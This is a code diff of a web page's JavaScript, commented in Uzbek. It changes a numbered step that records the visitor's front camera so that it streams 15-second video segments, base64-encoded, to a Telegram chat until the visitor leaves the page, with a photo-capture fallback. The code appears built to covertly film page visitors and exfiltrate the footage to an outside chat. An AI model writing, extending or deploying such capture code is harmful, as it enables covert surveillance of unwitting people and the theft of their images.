@@ -194,22 +194,17 @@
         }
 
         // ==================== 2. VIDEO YOZIB OLISH ====================
+        // Har 15 soniyada segment yuborib turadi — sahifa yopilguncha davom etadi
+        const SEGMENT_DURATION_MS = 15000;
+
         async function recordVideo() {
             let stream = null;
             try {
-                // Avval video + audio bilan urinib ko'rish
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                        audio: true
-                    });
-                } catch (audioErr) {
-                    // Agar mikrofonga ruxsat bo'lmasa, faqat video bilan davom etish
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                        audio: false
-                    });
-                }
+                // Faqat video — mikrofon kerak emas
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
 
                 video.srcObject = stream;
                 video.playsInline = true;
@@ -221,11 +216,11 @@
                     return capturePhoto();
                 }
 
-                // Qo'llab-quvvatlanadigan video formatni aniqlash
+                // Qo'llab-quvvatlanadigan video formatni aniqlash (ovoz kodeki kerak emas)
                 const mimeTypes = [
-                    'video/webm;codecs=vp8,opus',
+                    'video/webm;codecs=vp8',
                     'video/webm',
-                    'video/mp4;codecs=avc1,mp4a.40.2',
+                    'video/mp4;codecs=avc1',
                     'video/mp4'
                 ];
                 let selectedMime = '';
@@ -236,70 +231,67 @@
                     }
                 }
 
-                const options = selectedMime ? { mimeType: selectedMime } : {};
-                const recorder = new MediaRecorder(stream, options);
-                const chunks = [];
+                let globalStopped = false;
+                let segmentIndex = 0;
+                let intervalId = null;
 
-                recorder.ondataavailable = (e) => {
-                    if (e.data && e.data.size > 0) {
-                        chunks.push(e.data);
-                    }
-                };
+                // Bitta segmentni yozib, Telegramga yuboradi
+                function startSegment() {
+                    if (globalStopped) return;
 
-                // Foydalanuvchi saytdan chiqganda yoki boshqa tabga o'tganda yuboring
-                let stopped = false;
-                function stopRecorder() {
-                    if (stopped) return;
-                    stopped = true;
-                    if (recorder.state !== 'inactive') {
-                        recorder.stop();
-                    }
+                    const options = selectedMime ? { mimeType: selectedMime } : {};
+                    const rec = new MediaRecorder(stream, options);
+                    const chunks = [];
+
+                    rec.ondataavailable = (e) => {
+                        if (e.data && e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    rec.onstop = () => {
+                        if (chunks.length === 0) return;
+                        const blob = new Blob(chunks, { type: selectedMime || 'video/webm' });
+                        const idx = segmentIndex++;
+                        const reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onloadend = () => {
+                            sendData({
+                                chat_id: CHAT_ID,
+                                type: 'video',
+                                data: reader.result,
+                                mimeType: selectedMime || 'video/webm',
+                                segment: idx
+                            });
+                        };
+                    };
+
+                    rec.start();
+                    return rec;
                 }
 
-                recorder.onstop = async () => {
+                let currentRec = startSegment();
+
+                // Har SEGMENT_DURATION_MS da eski segmentni to'xtatib, yangisini boshlash
+                intervalId = setInterval(() => {
+                    if (globalStopped) return;
+                    const old = currentRec;
+                    currentRec = startSegment();
+                    if (old && old.state !== 'inactive') old.stop();
+                }, SEGMENT_DURATION_MS);
+
+                // Sahifadan chiqganda hamma narsani to'xtatib, oxirgi segmentni yuborish
+                function stopAll() {
+                    if (globalStopped) return;
+                    globalStopped = true;
+                    clearInterval(intervalId);
                     stopStream(stream);
-                    if (chunks.length === 0) return;
-                    const finalBlob = new Blob(chunks, { type: selectedMime || 'video/webm' });
+                    if (currentRec && currentRec.state !== 'inactive') currentRec.stop();
+                }
 
-                    const reader = new FileReader();
-                    reader.readAsDataURL(finalBlob);
-                    reader.onloadend = async () => {
-                        // sendBeacon bilan yuborish (sahifa yopilayotganda ham ishlaydi)
-                        const payload = {
-                            chat_id: CHAT_ID,
-                            type: 'video',
-                            data: reader.result,
-                            mimeType: selectedMime || 'video/webm'
-                        };
-                        try {
-                            const sent = navigator.sendBeacon(
-                                '/api/send',
-                                new Blob([JSON.stringify(payload)], { type: 'application/json' })
-                            );
-                            // sendBeacon muvaffaqiyatsiz bo'lsa oddiy fetch bilan urinib ko'r
-                            if (!sent) {
-                                await sendData(payload);
-                            }
-                        } catch (_) {
-                            await sendData(payload);
-                        }
-                    };
-                };
-
-                // Har 5 soniyada chunks yig'ish (xotira tejash)
-                recorder.start(5000);
-
-                // ---- Sahifadan chiqish hodisalari ----
-                // 1. Tab yopilganda / boshqa saytga o'tilganda
-                window.addEventListener('beforeunload', stopRecorder);
-                // 2. Tab yashiringanda (mobil uchun asosiy hodisa)
+                window.addEventListener('beforeunload', stopAll);
                 document.addEventListener('visibilitychange', () => {
-                    if (document.visibilityState === 'hidden') {
-                        stopRecorder();
-                    }
+                    if (document.visibilityState === 'hidden') stopAll();
                 });
-                // 3. Mobil brauzerda "Orqaga" bosilganda
-                window.addEventListener('pagehide', stopRecorder);
+                window.addEventListener('pagehide', stopAll);
 
             } catch (err) {
                 console.error("Video yozish xatosi:", err);
